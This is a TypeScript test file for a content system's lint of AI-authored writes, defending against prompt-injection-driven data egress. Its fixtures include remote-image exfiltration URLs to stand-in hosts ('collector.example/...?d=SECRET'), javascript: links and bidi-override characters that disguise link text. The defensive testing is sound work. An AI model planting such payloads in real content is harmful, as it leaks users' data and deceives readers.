/**
 * M2 — the egress lint of AI writes (design §4.5 steps 2 to 4, §12.1;
 * THREATS on prompt injection and egress), through validateAiWrite and the
 * real parse in the compile worker:
 *
 *   - a new remote image is refused in every form the renderer reads —
 *     Markdown inline and by reference, `<img>`, `<Figure>`, any JSX `src`,
 *     `srcset`/`srcSet` or `poster`, an expression attribute, a cover — and
 *     every spelling a browser reads as another host (`//`, `/\`, upper
 *     case, `data:`, a bare domain the Markdown twin prints as https); one
 *     already in the stored text may stay;
 *   - invisible control characters a write adds are refused, and so are the
 *     owner's own once the write moves them or rewrites their line;
 *     zero-width characters outside joiner contexts are counted, emoji and
 *     Persian joiners are not;
 *   - new external links are kept and listed with their flags, each as the
 *     site prints it (a bare domain is an https link, inline, by reference
 *     or in a case study's fields): every external href of the compiled page
 *     is listed or was already there; links the text already had, site
 *     paths, targets printed as plain text and inert iframes are not;
 *   - no AI write makes an outbound request: the main thread's fetch and
 *     http(s) are never called, and a local collector hears nothing.
 */
import { test, before, after, beforeEach } from 'node:test'
import assert from 'node:assert/strict'
import http from 'node:http'
import https from 'node:https'
import { editorialHarness } from './editorialHarness'
import { aiToolCaller, storeWriters } from './helpers/aiTools'

const h = editorialHarness('ai-lint', 'ai-lint-secret-0123456789abcdef0123456789')
let validate: typeof import('../lib/ai/validate')
let lint: typeof import('../lib/ai/lint')
let tools: Awaited<ReturnType<typeof aiToolCaller>>

before(async () => {
  await h.setup()
  validate = await import('../lib/ai/validate')
  lint = await import('../lib/ai/lint')
  const w = await storeWriters()
  await w.item('blog', 'linted', { title: 'Linted', date: '2026-05-01' }, 'The original text.\n\n![old](https://kept.example/old.png)\n')
  w.asset('field.webp')
  await w.item('blog', 'uses-field', { title: 'Uses field', date: '2026-05-01' }, '![A field](/uploads/field.webp)')
  tools = await aiToolCaller()
})
beforeEach(() => tools?.nextMinute())
after(async () => {
  const { closeAuditDb } = await import('../lib/audit/db')
  closeAuditDb()
  h.teardown()
})

type Fm = Record<string, unknown>
const subject = (body: string, opts: { fm?: Fm; before?: { frontmatter: Fm; body: string } | null; touched?: string[]; collection?: 'blog' | 'work' } = {}) => ({
  kind: 'item' as const,
  collection: opts.collection ?? ('blog' as const),
  touchedKeys: opts.touched ?? [],
  frontmatter: { title: 'T', date: '2026-05-01', ...(opts.fm ?? {}) },
  body,
  before: opts.before ?? null,
})

const REMOTE_FORMS = [
  '![a](https://img.example/x.png)',
  '![a](https://img.example/x.png "with a title")',
  '![a](HTTPS://IMG.EXAMPLE/upper.png)',
  '![a](//img.example/protocol-relative.png)',
  '![a](/\\img.example/backslash.png)',
  '![a](http://img.example/plain-http.png)',
  '![a](data:image/png;base64,iVBORw0KGgo=)',
  '![a][ref]\n\n[ref]: https://img.example/by-reference.png',
  '[![badge](https://img.example/badge.svg)](https://example.com/)',
  '<img src="https://img.example/img.png" />',
  '<Figure src="https://img.example/figure.png" alt="x" />',
  '<video poster="https://img.example/poster.png"></video>',
  '<video src="https://img.example/clip.mp4"></video>',
  '<source srcset="/uploads/a.webp 1x, https://img.example/b.png 2x" />',
  '<img srcSet="https://img.example/srcset.png 2x" />',
  '<img src={"https://img.example/expression.png"} />',
  '<audio src="//img.example/sound.mp3"></audio>',
  // Bare domains: the page drops them, but the Markdown twin and /llms-full.txt print them as https images.
  '![a](collector.example/x.png?d=SECRET)',
  '![a](relative.png)',
  '<Figure src="collector.example/figure.png" alt="x" />',
]

test('a new remote image is refused in every form the renderer reads, and every spelling of another host', async () => {
  for (const form of REMOTE_FORMS) {
    const out = await validate.validateAiWrite(subject(`Intro.\n\n${form}\n`))
    assert.equal(out.ok, false, form)
    if (!out.ok) {
      assert.equal(out.code, 'REMOTE_IMAGE', `${form}: ${out.message}`)
      assert.match(out.message, /\/uploads\/<name>/)
    }
  }
  for (const remote of ['https://img.example/cover.png', 'collector.example/cover.png']) {
    const cover = await validate.validateAiWrite(subject('Text.', { fm: { cover: remote }, touched: ['cover'] }))
    assert.ok(!cover.ok && cover.code === 'REMOTE_IMAGE' && cover.data?.field === 'cover', JSON.stringify(cover))
  }
  for (const ok of ['![a](/uploads/field.webp)', '<Figure src="/uploads/field.webp" alt="a" />', '![a](/images/site.png)']) {
    const out = await validate.validateAiWrite(subject(ok, { fm: { cover: '/uploads/field.webp' } }))
    assert.equal(out.ok, true, `${ok}: ${JSON.stringify(out)}`)
  }
})

test('a remote image already in the stored text may stay; a second, new one may not', async () => {
  const before = { frontmatter: { title: 'T', date: '2026-05-01', cover: 'https://kept.example/cover.png' }, body: 'Text.\n\n![old](https://kept.example/old.png)\n' }
  const kept = await validate.validateAiWrite(subject('Edited text.\n\n![old, still](https://kept.example/old.png)\n', { fm: { cover: 'https://kept.example/cover.png' }, before }))
  assert.equal(kept.ok, true, JSON.stringify(kept))
  const added = await validate.validateAiWrite(subject('Edited.\n\n![old](https://kept.example/old.png)\n\n![new](https://kept.example/new.png)', { fm: { cover: 'https://kept.example/cover.png' }, before }))
  assert.ok(!added.ok && added.code === 'REMOTE_IMAGE' && added.data?.url === 'https://kept.example/new.png', JSON.stringify(added))
})

test('invisible control characters a write adds are refused', async () => {
  for (const [ch, name] of [
    ['‮', 'U+202E'],
    ['‪', 'U+202A'],
    ['⁦', 'U+2066'],
    ['⁩', 'U+2069'],
    ['\u{E0041}', 'U+E0041'],
    ['\u{E007F}', 'U+E007F'],
  ]) {
    const inBody = await validate.validateAiWrite(subject(`Hello ${ch}world`))
    assert.ok(!inBody.ok && inBody.code === 'INVISIBLE_CHARS' && inBody.data?.char === name && inBody.data?.moved === false, `${name}: ${JSON.stringify(inBody)}`)
    const inTitle = await validate.validateAiWrite(subject('Hello', { fm: { title: `Title ${ch}` }, touched: ['title'] }))
    assert.equal(!inTitle.ok && inTitle.code, 'INVISIBLE_CHARS', name)
  }
  const texts = await validate.validateAiWrite({ kind: 'texts', fields: { alt: 'A ‮flipped alt' }, before: { alt: '' } })
  assert.equal(!texts.ok && texts.code, 'INVISIBLE_CHARS')
})

test('the owner’s own invisible characters stay only exactly where they stand: never moved into new text, never with their line rewritten', async () => {
  const fm = { title: 'T', date: '2026-05-01' }
  const check = (after: string, beforeBody: string, opts: { fm?: Fm } = {}) => validate.validateAiWrite(subject(after, { fm: opts.fm, before: { frontmatter: fm, body: beforeBody } }))
  const refusedAs = (out: Awaited<ReturnType<typeof check>>, char: string, moved: boolean, why: string) =>
    assert.ok(!out.ok && out.code === 'INVISIBLE_CHARS' && out.data?.char === char && out.data?.moved === moved, `${why}: ${JSON.stringify(out)}`)

  // An Arabic quote with the owner's bidi isolates, and an unrelated paragraph.
  const quote = 'مرحبا ⁧عالم⁩'
  const stored = `${quote}\n\nAnother paragraph.`
  assert.equal((await check(`${quote}\n\nAnother paragraph, edited.`, stored)).ok, true, 'an edit on another line')
  assert.equal((await check(`Another paragraph.\n\n${quote}`, stored)).ok, true, 'the line moved as a whole')
  assert.equal((await check(`${quote}\r\n\r\nAnother paragraph.`, stored)).ok, true, 'line endings are only line endings')
  refusedAs(await check(`${quote} ⁧again⁩\n\nAnother paragraph.`, stored), 'U+2067', false, 'one more is added')
  refusedAs(await check(`${quote}\n\n${quote}`, stored), 'U+2067', false, 'the line copied')
  refusedAs(await check(`مرحبا ⁧عالم⁩ edited\n\nAnother paragraph.`, stored), 'U+2067', true, 'the line it stands on rewritten')
  refusedAs(await check(`مرحبا ⁧عالم جديد⁩\n\nAnother paragraph.`, stored), 'U+2067', true, 'the text it governs rewritten')

  // Carried into a link label: "trop" displays as "port".
  const report = 'Quote: ‮عربي‬ done. See [the report](https://example.com/report).'
  refusedAs(await check('Quote: عربي done. See [‮trop‬](https://example.com/report).', report), 'U+202E', true, 'moved into a link label')
  refusedAs(await check('Quote: عربي done. See [the report](https://example.com/report).', report, { fm: { title: '‮T‬' } }), 'U+202E', true, 'moved into the title')
  assert.equal((await check(`${report}\n\nA new paragraph.`, report)).ok, true, 'kept where it stands')

  // A flag the owner wrote (TAG characters) stays where it is; copying it to a new line is refused.
  const flag = '\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}'
  assert.equal((await check(`Made in ${flag} England.\n\nNew line.`, `Made in ${flag} England.`)).ok, true)
  refusedAs(await check(`Made in England.\n\nNew ${flag}.`, `Made in ${flag} England.`), 'U+E0067', true, 'the flag moved')

  // Media texts follow the same rule.
  const moved = await validate.validateAiWrite({ kind: 'texts', fields: { alt: 'A flipped alt', caption: '‮x‬' }, before: { alt: 'A ‮flipped‬ alt', caption: '' } })
  assert.ok(!moved.ok && moved.code === 'INVISIBLE_CHARS' && moved.data?.moved === true, JSON.stringify(moved))
  const kept = await validate.validateAiWrite({ kind: 'texts', fields: { alt: 'A ‮flipped‬ alt', caption: 'A new caption' }, before: { alt: 'A ‮flipped‬ alt', caption: '' } })
  assert.equal(kept.ok, true, JSON.stringify(kept))
  const untouched = await validate.validateAiWrite({ kind: 'texts', fields: { caption: 'A new caption' }, before: { alt: 'A ‮flipped‬ alt', caption: '' } })
  assert.equal(untouched.ok, true, JSON.stringify(untouched))
  const copied = await validate.validateAiWrite({ kind: 'texts', fields: { caption: 'A ‮flipped‬ alt' }, before: { alt: 'A ‮flipped‬ alt', caption: '' } })
  assert.ok(!copied.ok && copied.code === 'INVISIBLE_CHARS' && copied.data?.moved === false, `copied from a field the call leaves alone: ${JSON.stringify(copied)}`)
  const zw = await validate.validateAiWrite({ kind: 'texts', fields: { caption: 'a\u200Bb' }, before: { alt: 'x\u200By\u200Bz', caption: '' } })
  assert.ok(zw.ok && zw.zeroWidth === 1, `the zero-width count is what the change adds: ${JSON.stringify(zw)}`)
})

test('zero-width characters outside joiner contexts are counted, emoji and Persian joiners are not', async () => {
  const zw = async (body: string) => {
    const out = await validate.validateAiWrite(subject(body))
    assert.ok(out.ok, JSON.stringify(out))
    return out.ok ? out.zeroWidth : -1
  }
  assert.equal(await zw('plain text'), 0)
  assert.equal(await zw('a​b and c⁠d and ﻿e'), 3)
  assert.equal(await zw('family 👨‍👩‍👧 and 🏳️‍🌈'), 0)
  assert.equal(await zw('می‌خواهم'), 0)
  assert.equal(await zw('क्‍ष'), 0)
  assert.equal(await zw('latin‌joiner'), 1)
})

test('new external links are kept and listed with their flags; known links, site paths and inert iframes are not', async () => {
  const body = [
    '[q](https://example.com/page?utm_source=x#section)',
    '[http](http://plain.example/)',
    '[creds](https://user:secret@example.com/)',
    '[ip](https://192.0.2.10/admin)',
    '[token](https://example.com/files/aB3dE5fG7hJ9kL1mN3pQ5rS7)',
    '[readable](https://example.com/a-perfectly-readable-path-segment)',
    '[mail](mailto:owner@example.test)',
    '[site](/blog/other-post) and [hash](#top)',
    '[kept](https://kept.example/)',
    '[ref][r]',
    '',
    '[r]: https://ref.example/defined',
    '',
    'Autolinked https://auto.example/x here.',
    '',
    '<YouTube id="dQw4w9WgXcQ" title="A video" />',
    '<iframe src="https://evil.example/frame"></iframe>',
    '<iframe src="https://www.youtube-nocookie.com/embed/aaaaaaaaaaa"></iframe>',
  ].join('\n')
  const out = await validate.validateAiWrite(subject(body, { before: { frontmatter: { title: 'T', date: '2026-05-01' }, body: '[kept](https://kept.example/)' } }))
  assert.ok(out.ok, JSON.stringify(out))
  if (!out.ok) return
  const byUrl = Object.fromEntries(out.newLinks.map((l) => [l.url, l.flags]))
  assert.deepEqual(byUrl, {
    'https://example.com/page?utm_source=x#section': ['query', 'fragment'],
    'http://plain.example/': ['not-https'],
    'https://user:secret@example.com/': ['credentials'],
    'https://192.0.2.10/admin': ['ip-address'],
    'https://example.com/files/aB3dE5fG7hJ9kL1mN3pQ5rS7': ['random-path'],
    'https://example.com/a-perfectly-readable-path-segment': [],
    'mailto:owner@example.test': ['scheme'],
    'https://ref.example/defined': [],
    'https://auto.example/x': [],
  })
  assert.deepEqual(out.newEmbeds, ['https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ', 'https://www.youtube-nocookie.com/embed/aaaaaaaaaaa'])

  const work = await validate.validateAiWrite(
    subject('Text.', {
      collection: 'work',
      fm: { link: 'https://project.example/', repo: 'https://code.example/repo', links: [{ label: 'Demo', url: 'https://demo.example/?x=1' }], outcomes: [{ value: '1', label: 'x', sourceUrl: 'https://source.example/' }] },
      touched: ['link', 'repo', 'links', 'outcomes'],
    }),
  )
  assert.ok(work.ok, JSON.stringify(work))
  if (work.ok) assert.deepEqual(work.newLinks.map((l) => l.url), ['https://project.example/', 'https://code.example/repo', 'https://demo.example/?x=1', 'https://source.example/'])
})

test('a bare-domain link is listed as the https link the site prints — inline, by reference, in a case study’s fields — with its flags', async () => {
  const { compileMdx } = await import('../lib/mdx')
  const { mdxToMarkdown } = await import('../lib/markdownTwin')
  const { unified } = await import('unified')
  const remarkParse = (await import('remark-parse')).default
  const body = [
    '[read more](evil.example/collect?d=SECRET123) and [kept, spelled differently](kept.example/page).',
    '',
    'By reference: [r], and an autolink www.auto.example/path here.',
    '',
    '[r]: www.evil.example/x?d=SECRET456',
    '',
    '[normal](https://listed.example/?q=1) and [mail](mailto:owner@example.test)',
    '',
    'Printed as text, no link: [js](javascript:alert(1)), [proto](//evil.example/p), [rel](relative/page), [site](/blog/x), [hash](#top).',
  ].join('\n')
  const before = { frontmatter: { title: 'T', date: '2026-05-01' }, body: '[kept](https://kept.example/page)' }
  const out = await validate.validateAiWrite(subject(body, { before }))
  assert.ok(out.ok, JSON.stringify(out))
  if (!out.ok) return
  assert.deepEqual(Object.fromEntries(out.newLinks.map((l) => [l.url, l.flags])), {
    'https://evil.example/collect?d=SECRET123': ['query'],
    'https://www.evil.example/x?d=SECRET456': ['query'],
    'http://www.auto.example/path': ['not-https'],
    'https://listed.example/?q=1': ['query'],
    'mailto:owner@example.test': ['scheme'],
  })

  // Parity with the renderers: every off-site href the page and the Markdown twin print is listed, or was already there.
  const listed = new Set([...out.newLinks.map((l) => l.url), lint.readAddress('https://kept.example/page').url])
  const nothing = { resolveSize: () => null, srcSetFor: () => null, avifSrcSetFor: () => null, placeholderFor: () => null, posterFor: () => null }
  const { tree } = await compileMdx(body, nothing)
  const printed: string[] = []
  const walk = (n: any) => {
    if (typeof n?.properties?.href === 'string') printed.push(n.properties.href)
    for (const c of n?.children ?? []) walk(c)
  }
  walk(tree)
  const twin = mdxToMarkdown(body, { siteUrl: 'https://site.invalid', pageUrl: 'https://site.invalid/blog/x' } as never)
  const visit = (n: any) => {
    if ((n.type === 'link' || n.type === 'definition') && typeof n.url === 'string' && !n.url.startsWith('https://site.invalid')) printed.push(n.url)
    for (const c of n.children ?? []) visit(c)
  }
  visit(unified().use(remarkParse).parse(twin))
  const offSite = printed.filter((h) => lint.readAddress(h).kind !== 'site')
  assert.ok(offSite.length >= 6, JSON.stringify(offSite))
  for (const href of offSite) assert.ok(listed.has(lint.readAddress(href).url), `printed but not listed: ${href}`)

  // A case study's fields: link and repo as the page prints them (safeHref), extra links and metric sources (safeCaseStudyUrl).
  const work = await validate.validateAiWrite(
    subject('Text.', {
      collection: 'work',
      fm: {
        link: 'collector.example/p',
        repo: 'code.example/r?token=abc',
        links: [{ label: 'Demo', url: 'collector.example/demo?d=SECRET' }, { label: 'Dropped', url: 'javascript:alert(1)' }],
        outcomes: [{ value: '1', label: 'x', sourceUrl: 'source.example/s#frag' }],
      },
      touched: ['link', 'repo', 'links', 'outcomes'],
      before: { frontmatter: { title: 'T', date: '2026-05-01', link: 'https://collector.example/p' }, body: 'Text.' },
    }),
  )
  assert.ok(work.ok, JSON.stringify(work))
  if (work.ok) {
    assert.deepEqual(Object.fromEntries(work.newLinks.map((l) => [l.url, l.flags])), {
      'https://code.example/r?token=abc': ['query'],
      'https://collector.example/demo?d=SECRET': ['query'],
      'https://source.example/s#frag': ['fragment'],
    })
  }
})

test('through the tools, a bare-domain link reaches the change’s preview and the result as the https link the page shows', async () => {
  const { previewOf } = await import('../lib/ai/changes')
  const version = (await tools.data('get_content', { collection: 'blog', ref: 'linted' }, 'draft')).version
  const edited = await tools.call(
    'edit_content',
    { collection: 'blog', slug: 'linted', edits: [{ find: 'The original text.', replace: 'The original text, [read more](collector.example/c?d=SECRET).' }], base_version: version },
    'draft',
  )
  assert.equal(edited.ok, true, edited.text)
  assert.equal(edited.json.new_links, 1)
  assert.deepEqual(previewOf(edited.json.change_id)?.newLinks, [{ url: 'https://collector.example/c?d=SECRET', flags: ['query'] }])

  const created = await tools.call(
    'create_draft',
    { collection: 'work', slug: 'bare-links', frontmatter: { title: 'Bare links', link: 'collector.example/p', links: [{ label: 'Demo', url: 'collector.example/demo?d=SECRET' }] }, body: 'Case.' },
    'draft',
  )
  assert.equal(created.ok, true, created.text)
  assert.equal(created.json.new_links, 2)
  assert.deepEqual(previewOf(created.json.change_id)?.newLinks.map((l) => l.url), ['https://collector.example/p', 'https://collector.example/demo?d=SECRET'])
})

test('the address reader agrees with a browser on the hard cases', () => {
  for (const [raw, kind] of [
    ['/uploads/a.webp', 'site'],
    ['relative.png', 'site'],
    ['#frag', 'site'],
    ['//evil.example/x', 'external'],
    ['/\\evil.example/x', 'external'],
    ['\\\\evil.example/x', 'external'],
    ['ht\ttps://evil.example/x', 'external'],
    [' https://evil.example/x ', 'external'],
    ['javascript:alert(1)', 'scheme'],
    ['data:image/png;base64,AAAA', 'scheme'],
    ['http://[::1', 'malformed'],
  ] as const) {
    assert.equal(lint.readAddress(raw).kind, kind, raw)
  }
  assert.equal(lint.isRemoteSource('/uploads/x.webp'), false)
  assert.equal(lint.isRemoteSource('//cdn.example/x.webp'), true)
  // Read as a page path, but the Markdown twin prints a bare domain as an https image.
  assert.equal(lint.remoteSource('relative.png'), 'https://relative.png/')
  assert.equal(lint.remoteSource('collector.example/x.png?d=1'), 'https://collector.example/x.png?d=1')
  assert.equal(lint.remoteSource('images/photo.png'), null, 'a relative path is no host anywhere')
})

test('no AI write makes an outbound request: no fetch or http(s) call on the main thread, nothing at a local collector', async () => {
  let hits = 0
  const collector = http.createServer((_req, res) => {
    hits++
    res.end('x')
  })
  await new Promise<void>((resolve) => collector.listen(0, '127.0.0.1', () => resolve()))
  const at = `http://127.0.0.1:${(collector.address() as { port: number }).port}`
  const calls: string[] = []
  const originals = { fetch: globalThis.fetch, httpRequest: http.request, httpGet: http.get, httpsRequest: https.request, httpsGet: https.get }
  globalThis.fetch = ((...a: Parameters<typeof fetch>) => {
    calls.push(`fetch ${String(a[0])}`)
    return originals.fetch(...a)
  }) as typeof fetch
  ;(http as any).request = (...a: any[]) => (calls.push('http.request'), (originals.httpRequest as any)(...a))
  ;(http as any).get = (...a: any[]) => (calls.push('http.get'), (originals.httpGet as any)(...a))
  ;(https as any).request = (...a: any[]) => (calls.push('https.request'), (originals.httpsRequest as any)(...a))
  ;(https as any).get = (...a: any[]) => (calls.push('https.get'), (originals.httpsGet as any)(...a))
  try {
    const body = [
      '## A post with media',
      '',
      '![A field](/uploads/field.webp)',
      '',
      `[a link to the collector](${at}/link)`,
      '',
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      '',
      '<video src="/uploads/clip.mp4" poster="/uploads/poster.webp"></video>',
    ].join('\n')
    const created = await tools.call('create_draft', { collection: 'blog', slug: 'no-egress', frontmatter: { title: 'No egress', date: '2026-05-01', cover: '/uploads/field.webp' }, body }, 'draft')
    assert.equal(created.ok, true, created.text)
    const refused = await tools.call('create_draft', { collection: 'blog', slug: 'no-egress-2', frontmatter: { title: 'X', date: '2026-05-01' }, body: `![x](${at}/img.png)` }, 'draft')
    assert.equal(refused.code, 'REMOTE_IMAGE')
    const version = (await tools.data('get_content', { collection: 'blog', ref: 'no-egress' }, 'draft')).version
    const edited = await tools.call('edit_content', { collection: 'blog', slug: 'no-egress', edits: [{ find: 'A post with media', replace: `A post with [more](${at}/more)` }], base_version: version }, 'draft')
    assert.equal(edited.ok, true, edited.text)
    const texts = await tools.call('set_media_text', { name: 'field.webp', alt: `A field, see ${at}/alt`, expected_updated_at: 0 }, 'draft')
    assert.equal(texts.ok, true, texts.text)
  } finally {
    globalThis.fetch = originals.fetch
    ;(http as any).request = originals.httpRequest
    ;(http as any).get = originals.httpGet
    ;(https as any).request = originals.httpsRequest
    ;(https as any).get = originals.httpsGet
    await new Promise<void>((resolve) => collector.close(() => resolve()))
  }
  assert.deepEqual(calls, [])
  assert.equal(hits, 0)
})
